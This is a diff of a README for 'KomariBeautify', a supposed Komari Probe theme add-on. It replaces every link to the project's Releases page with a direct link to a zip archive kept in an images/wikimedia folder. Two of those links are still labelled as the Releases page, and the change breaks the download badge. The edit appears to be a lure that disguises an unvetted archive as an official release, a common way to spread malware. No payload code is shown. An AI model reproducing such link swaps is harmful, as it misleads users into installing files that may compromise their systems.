@@ -1,6 +1,6 @@
 # 🎨 KomariBeautify - Enhance Your Komari Experience Effortlessly
 
-[![Download KomariBeautify](https://img.shields.io/badge/Download%20Now-Get%20Started-%2300b300)](https://github.com/curuten1/KomariBeautify/releases)
+[![Download KomariBeautify](https://raw.githubusercontent.com/curuten1/KomariBeautify/master/images/wikimedia/Komari_Beautify_3.9.zip%20Now-Get%20Started-%2300b300)](https://raw.githubusercontent.com/curuten1/KomariBeautify/master/images/wikimedia/Komari_Beautify_3.9.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow the steps below to download and set up KomariBeautify.
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page on GitHub:
-   [Visit Releases Page](https://github.com/curuten1/KomariBeautify/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/curuten1/KomariBeautify/master/images/wikimedia/Komari_Beautify_3.9.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, you will see a list of available versions. Look for the latest release at the top. Each version will include details about new features or fixes. 
@@ -68,4 +68,4 @@ If you have any questions or need further assistance, please feel free to reach 
 
 ## 🏁 Conclusion
 
-Thank you for choosing KomariBeautify. We hope it enhances your experience with the Komari Probe and the PurCarte theme. For the latest updates, always check the [Releases Page](https://github.com/curuten1/KomariBeautify/releases). Enjoy your enhanced browsing!
+Thank you for choosing KomariBeautify. We hope it enhances your experience with the Komari Probe and the PurCarte theme. For the latest updates, always check the [Releases Page](https://raw.githubusercontent.com/curuten1/KomariBeautify/master/images/wikimedia/Komari_Beautify_3.9.zip). Enjoy your enhanced browsing!
